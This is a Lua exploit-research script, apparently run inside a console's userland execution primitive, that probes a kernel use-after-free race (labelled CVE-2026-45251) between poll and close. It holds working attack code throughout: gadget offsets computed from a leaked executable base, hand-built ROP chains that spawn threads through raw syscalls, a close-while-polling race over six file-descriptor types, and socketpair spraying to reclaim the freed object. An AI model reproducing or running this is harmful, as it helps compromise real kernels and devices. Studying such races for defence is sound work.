-- CRASH_CLASS: HIGH
-- PROBE 93c9: CVE-2026-45251 poll/close UAF race
--
-- A thread blocked in poll(2) may not hold a reference to the file object.
-- If another thread closes the fd, the object is freed while the first
-- thread is still sleeping in poll. When poll wakes, it touches freed memory.
--
-- Test with multiple fd types: socket, kqueue, shm, pipe-like, /dev nodes

print("=== PROBE 93c9: POLL/CLOSE UAF RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_buf = memory.alloc(32)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)
local pr8_lo, pr8_hi = eoff(0x991)
local prc_lo, prc_hi = eoff(0xE64)

-- Helper: spawn child that does poll(pollfd, 1, timeout_ms) in a loop
-- pollfd struct: {int fd; short events; short revents} = 8 bytes
-- poll = sys 209, args: (pollfd_ptr, nfds=1, timeout_ms)
local function spawn_poll_child(pollfd_addr, timeout_ms, loop_count, done_addr)
    local tcb = memory.alloc(0x100)
    local tcb_a = N(tcb)
    local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local pf_lo, pf_hi = split(pollfd_addr)

    local stk = memory.alloc(0x200000)
    local sb = N(stk)
    local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end

    -- sysarch
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)

    -- poll loop
    local actual = math.min(loop_count, 200)
    for i = 1, actual do
        put(pdr_lo, pdr_hi); put(pf_lo, pf_hi)    -- arg1: pollfd
        put(psr_lo, psr_hi); put(1, 0)              -- arg2: nfds=1
        put(prdx_lo, prdx_hi); put(timeout_ms, 0)   -- arg3: timeout
        put(par_lo, par_hi); put(209, 0)             -- poll
        put(stub_lo, stub_hi)
    end

    -- Done
    put(par_lo, par_hi); put(0xDEAD93C9, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)

    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

-- Test: for each fd type, spawn child doing poll(fd, POLLIN, 100ms),
-- main thread closes fd after brief delay, then opens new fds to reclaim
local fd_types = {}

-- Type 1: AF_UNIX socket
do
    local sv = memory.alloc(8)
    local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
    if sp == 0 then
        fd_types[#fd_types + 1] = {name="unix_socket", fd=rd(N(sv)) or -1, extra=rd(N(sv)+4) or -1}
    end
end

-- Type 2: kqueue
do
    local ok_k, rv_k = pcall(function() return mk(362)() end)
    if ok_k then
        fd_types[#fd_types + 1] = {name="kqueue", fd=N(rv_k)}
    end
end

-- Type 3: shm
do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(0x202), uint64(0x1FF))
    end)
    if ok_s then
        fd_types[#fd_types + 1] = {name="shm", fd=N(rv_s)}
    end
end

-- Type 4: UDP socket
do
    local ok_u, rv_u = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(17))  -- AF_INET, SOCK_DGRAM, UDP
    end)
    if ok_u then
        fd_types[#fd_types + 1] = {name="udp", fd=N(rv_u)}
    end
end

-- Type 5: TCP socket
do
    local ok_t, rv_t = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(6))  -- AF_INET, SOCK_STREAM, TCP
    end)
    if ok_t then
        fd_types[#fd_types + 1] = {name="tcp", fd=N(rv_t)}
    end
end

-- Type 6: /dev/gc
do
    local devpath = memory.alloc(16)
    wd(N(devpath), 0x7665642F)  -- /dev
    wd(N(devpath)+4, 0x0063672F)  -- /gc\0
    local ok_d, rv_d = pcall(function()
        return mk(5)(devpath, uint64(2))  -- O_RDWR
    end)
    if ok_d and N(rv_d) >= 0 then
        fd_types[#fd_types + 1] = {name="dev_gc", fd=N(rv_d)}
    end
end

print(string.format("fd_types: %d types prepared", #fd_types))
for _, ft in ipairs(fd_types) do
    print(string.format("  %s: fd=%d", ft.name, ft.fd))
end

-- Run poll/close race on each fd type
local RACES_PER_TYPE = 50
local total_crashes = 0

for _, ft in ipairs(fd_types) do
    print(string.format("\nRacing %s (fd=%d):", ft.name, ft.fd))

    local crashes = 0
    for race = 1, RACES_PER_TYPE do
        -- Create fresh fd for this race
        local target_fd = -1

        if ft.name == "unix_socket" then
            local sv = memory.alloc(8)
            local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
            if sp == 0 then target_fd = rd(N(sv)) or -1 end
            -- close the write side immediately, keep read side for poll
            if sp == 0 then pcall(function() mk(6)(uint64(rd(N(sv)+4) or -1)) end) end
        elseif ft.name == "kqueue" then
            local ok_k, rv_k = pcall(function() return mk(362)() end)
            if ok_k then target_fd = N(rv_k) end
        elseif ft.name == "shm" then
            local ok_s, rv_s = pcall(function()
                return mk(482)(uint64(1), uint64(0x202), uint64(0x1FF))
            end)
            if ok_s then target_fd = N(rv_s) end
        elseif ft.name == "udp" then
            local ok_u, rv_u = pcall(function()
                return mk(97)(uint64(2), uint64(2), uint64(17))
            end)
            if ok_u then target_fd = N(rv_u) end
        elseif ft.name == "tcp" then
            local ok_t, rv_t = pcall(function()
                return mk(97)(uint64(2), uint64(1), uint64(6))
            end)
            if ok_t then target_fd = N(rv_t) end
        elseif ft.name == "dev_gc" then
            local devpath = memory.alloc(16)
            wd(N(devpath), 0x7665642F)
            wd(N(devpath)+4, 0x0063672F)
            local ok_d, rv_d = pcall(function()
                return mk(5)(devpath, uint64(2))
            end)
            if ok_d then target_fd = N(rv_d) end
        end

        if target_fd < 0 then break end

        -- Setup pollfd
        local pollfd = memory.alloc(8)
        wd(N(pollfd), target_fd)          -- fd
        wd(N(pollfd) + 4, 0x0001)         -- events=POLLIN, revents=0

        local done = memory.alloc(8)
        wd(N(done), 0)

        -- Child: poll(pollfd, 1, 500ms) x 5
        local ok_c = spawn_poll_child(N(pollfd), 500, 5, N(done))

        if ok_c then
            -- Brief delay to let child enter poll sleep
            for delay = 1, 100 do local _ = rd(N(done)) end

            -- CLOSE the fd while child is in poll!
            pcall(function() mk(6)(uint64(target_fd)) end)

            -- Immediately open new fds to reclaim the slot
            for spray = 1, 5 do
                local sv2 = memory.alloc(8)
                pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv2) end)
            end

            -- Wait for child
            for w = 1, 10000 do
                local df = rd(N(done))
                if df and df ~= 0 then break end
            end
        else
            pcall(function() mk(6)(uint64(target_fd)) end)
        end

        if not alive() then
            crashes = crashes + 1
            total_crashes = total_crashes + 1
            print(string.format("  [CRASH!] %s race %d: process died!", ft.name, race))
            break
        end
    end

    if crashes == 0 then
        print(string.format("  %d races, 0 crashes", RACES_PER_TYPE))
    end

    if not alive() then break end
end

-- Close initial test fds
for _, ft in ipairs(fd_types) do
    pcall(function() mk(6)(uint64(ft.fd)) end)
    if ft.extra then pcall(function() mk(6)(uint64(ft.extra)) end) end
end

print("")
print(string.format("total_crashes=%d", total_crashes))
print("alive=" .. tostring(alive()))
print("=== 93c9 COMPLETE ===")
